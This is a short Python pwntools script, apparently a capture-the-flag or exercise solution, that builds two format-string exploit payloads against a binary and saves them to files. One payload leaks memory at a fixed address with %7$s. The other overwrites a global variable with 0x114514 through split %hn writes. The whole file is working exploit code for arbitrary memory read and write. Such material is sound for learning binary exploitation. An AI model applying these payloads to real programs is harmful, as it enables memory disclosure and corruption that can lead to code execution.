from pwn import *

address_of_var = 0x404038

# leak the value of var
def leak_var():
    payload = b""
    payload += b"AAAA%7$s"
    # address pointed by %7$s
    payload += p64(address_of_var)
    return payload

# overwrite the var with 0x114514
def write_var():
    payload = b""
    # overwrite the upper 2 bytes with 0x0011 (17)
    payload += b"%17c"
    payload += b"%9$hn"
    # overwrite the lower 2 bytes with 0x4514 (17 + 17667)
    payload += b"%17667c"
    payload += b"%10$hn"
    # padding
    payload += b"AA"
    # address pointed by %9$hn
    payload += p64(address_of_var + 2)
    # address pointed by %10$hn
    payload += p64(address_of_var)
    return payload

with open("leak_var.txt", "wb") as f:
    f.write(leak_var())

with open("write_var.txt", "wb") as f:
    f.write(write_var())
